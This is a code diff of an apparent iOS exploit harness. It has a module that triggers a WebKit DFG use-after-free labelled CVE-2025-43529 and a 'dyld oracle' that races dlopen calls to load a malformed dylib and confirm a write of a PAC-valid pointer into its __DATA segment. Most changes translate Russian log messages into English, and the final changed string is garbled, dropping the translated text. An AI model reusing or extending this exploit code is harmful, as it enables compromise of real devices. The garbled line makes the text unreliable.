@@ -6,6 +6,7 @@
 #import <string.h>
 #import <stdio.h>
 #import "Modules.h"
+#import "AppDelegate.h"
 
 // ---------------------------------------------------------------------------
 // WebKit DFG store-barrier UAF (CVE-2025-43529) — proven on 23C5027f at round 112.
@@ -60,7 +61,7 @@ NSString *ModWebKitUAF(void) {
     WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
     [wv loadHTMLString:[NSString stringWithUTF8String:kUAFPage] baseURL:nil];
     dispatch_semaphore_t s = dispatch_semaphore_create(0);
-    __block NSString *res = @"(нет ответа)";
+    __block NSString *res = @"(no answer)";
     NSString *js = [NSString stringWithUTF8String:kUAFPage];
     [wv evaluateJavaScript:@"document.body.innerText" completionHandler:^(id v, NSError *e) {
         if (e) res = e.localizedDescription ?: @"error";
@@ -113,16 +114,16 @@ NSString *ModDyldOracle(void) {
     NSString *cl = [bundle stringByAppendingPathComponent:@"libclient.dylib"];
     NSString *mal = [bundle stringByAppendingPathComponent:@"Frameworks/libmalformed.dylib"];
     if (![[NSFileManager defaultManager] fileExistsAtPath:mal])
-        return @"bundled dylibs не найдены";
+        return @"bundled dylibs not found";
 
     void *h_ex = dlopen(ex.UTF8String, RTLD_NOW | RTLD_GLOBAL);
-    if (!h_ex) { AveLog(S(@"    dlopen libexports: %s", dlerror())); return @"libexports не загрузился"; }
-    AveLog(@"    libexports загружен");
+    if (!h_ex) { AveLog(S(@"    dlopen libexports: %s", dlerror())); return @"libexports did not load"; }
+    AveLog(@"    libexports loaded");
 
     // Thread B: the 99k-symbol client is what opens the page-in-linking gate
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         void *h_cl = dlopen(cl.UTF8String, RTLD_NOW);
-        AveLog(h_cl ? @"    libclient загружен (gate открыт)" : @"    libclient не загрузился");
+        AveLog(h_cl ? @"    libclient loaded (gate open)" : @"    libclient did not load");
     });
 
     AveSleep(600);                      // let Thread B start loading first
@@ -130,29 +131,29 @@ NSString *ModDyldOracle(void) {
     void *h_mal = dlopen(mal.UTF8String, RTLD_NOW);
     if (!h_mal) {
         AveLog(S(@"    dlopen libmalformed: %s", dlerror()));
-        return @"libmalformed ОТКЛОНЁН dyld";
+        return @"libmalformed REJECTED by dyld";
     }
-    AveLog(@"    libmalformed принята dyld");
+    AveLog(@"    libmalformed accepted by dyld");
 
     void *data = find_data_of("libmalformed.dylib");
-    if (!data) return @"__DATA libmalformed не найден";
+    if (!data) return @"__DATA of libmalformed not found";
     uint64_t *slots = (uint64_t *)data;
     uint64_t cb = slots[0], wt = slots[2], ca = slots[3], wt2 = slots[4];
     AveLog(S(@"    canary_before=%#llx canary_after=%#llx wt=%#llx wt2=%#llx", cb, ca, wt, wt2));
     BOOL canaries = (cb == 0xAAAAAAAAAAAAAAAAULL) && (ca == 0xBBBBBBBBBBBBBBBBULL);
     BOOL written  = (wt != 0xDEADDEADDEADDEADULL);
     int bit63 = (int)((wt >> 63) & 1);
-    AveLog(S(@"    dyld %@ в __DATA+0x10; bit63=%d (%s)",
-             written ? @"ЗАПИСАЛ" : @"не писал", bit63,
-             bit63 ? @"encoded bind" : @"разрешённый указатель"));
+    AveLog(S(@"    dyld %@ into __DATA+0x10; bit63=%d (%s)",
+             written ? @"WROTE" : @"did not write", bit63,
+             bit63 ? @"encoded bind" : @"resolved pointer"));
     // measure against the symbol's own address (as the PoC does)
     void *sym = dlsym(RTLD_DEFAULT, "write_target_value");
     if (sym) AveLog(S(@"    dlsym(write_target_value) = %p", sym));
 
     dlclose(h_mal);
-    return S(@"dyld-оракул: %@ canaries=%@ wt=%#llx (dlsym=%p)%@",
-             written ? @"ЗАПИСЬ ПОДТВЕРЖДЕНА" : @"нет записи",
-             canaries ? @"целы" : @"сломаны",
+    return S(@"dyld oracle: %@ canaries=%@ wt=%#llx (dlsym=%p)%@",
+             written ? @"WRITE CONFIRMED" : @"no write",
+             canaries ? @"intact" : @"broken",
              (unsigned long long)wt, sym,
-             written && bit63 == 0 ? @" ← PAC-валидный указатель получен" : @"");
+             written && bit63 == 0 ? @"  PAC-  " : @"");
 }
